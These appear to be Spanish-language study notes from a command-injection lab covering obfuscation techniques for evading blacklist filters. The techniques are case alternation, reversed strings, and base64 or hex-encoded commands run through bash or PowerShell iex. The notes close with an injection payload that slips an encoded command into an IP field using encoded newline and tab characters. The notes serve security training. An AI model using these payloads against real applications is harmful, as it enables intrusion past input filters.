## Manipulacion de mayusculas y minusculas

Usar todas mayuculas o alternarlas. Esto suele funcionar para listas negras de palabras que  tengan case sensitive:

1. Windows permite la variacion porque PS y CMD no diferencia entre mayusculas y minusculas

![[Pasted image 20260723151134.png]]


2. Linux tenemos que ser mas creativos porque la bash es case-sensitive

```
$(tr "[A-Z]" "[a-z]"<<<"COMANDO")
```
![[Pasted image 20260723151329.png]]

`tr` reemplaza los caracteres en mayuscula por minuscualas. Pero si lo usamos en el Host Checker veremos que esta bloqueado:

![[Pasted image 20260723151432.png]]

Esto se debe a que el comando tiene espacios que como vimos son caracteres que no le gusta:

![[Pasted image 20260723151523.png]]


Otro comando que podemos usar es:

```
(a="COMANDO";printf %s "${a,,}")
```
![[Pasted image 20260723151556.png]]

## Comandos invertidos

Invertimos el comando en nuestra shell y luego le damos la vuelta

- Linux:

```
echo 'COMANDO' | rev 
```
![[Pasted image 20260723151658.png]]

```
$(rev<<<'imaohw')
```
![[Pasted image 20260723151737.png]]
![[Pasted image 20260723151747.png]]


- Windows:

```
"COMANDO"[-1..-20] -join ''
```
![[Pasted image 20260723151821.png]]

```
iex "$('imaohw'[-1..-20] -join '')"
```
![[Pasted image 20260723151836.png]]


## Comandos codificados

- Linux:
Podemos usar varias herramientas de codificacion como base64 o xxd (codificacion hexadecimal)

```
echo -n 'COMANDO' | base64
```
![[Pasted image 20260723153500.png]]

Podemos crear un comando que decodifique la cadena usando una subshell con $()

```
bash<<<$(base64 -d<<<BASE64)
```
![[Pasted image 20260723153544.png]]

	Estamos usando <<< ya que | es un caracter filtrado

![[Pasted image 20260723153630.png]]

Si hay comandos como bash que esta filtrado podemos usar tecnicas como la seccion anterior de uso de ' o " entre otras cosas

Tambien podemos usar alternativas a bash como `sh, openssl para la decodificacion en BASE64 o xxd para la decodificacion en HEXADECIMAL`


- Windows:

Codificamos el comando:

```
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('COMANDO'))
```
![[Pasted image 20260723153919.png]]

o si queremos hacerlo desde Linux para Windows la convertimos en utf-16:

```
echo -n COMANDO | iconv -f utf-8 -t utf-16le | base64
```
![[Pasted image 20260723154010.png]]

Decodificamos la cadena usando una subshell con `iex $()`

```
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('BASE64')))"
```
![[Pasted image 20260723154038.png]]


Mas tecnicas: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)


## Ejemplo practico

Encuentra la salida del sisguiente comando: `find /usr/share/ | grep root | grep mysql | tail -n 1`

1. Pasamos el comando a base64 para ofuscarlo

![[Pasted image 20260723154249.png]]

2. Usamos el payload para crear una subshell que decodifique el base64 y se lo pase a la bash y se ejecute

```
127.0.0.1%0a${IFS}bash<<<$(base64%09-d<<<BASE64)
```
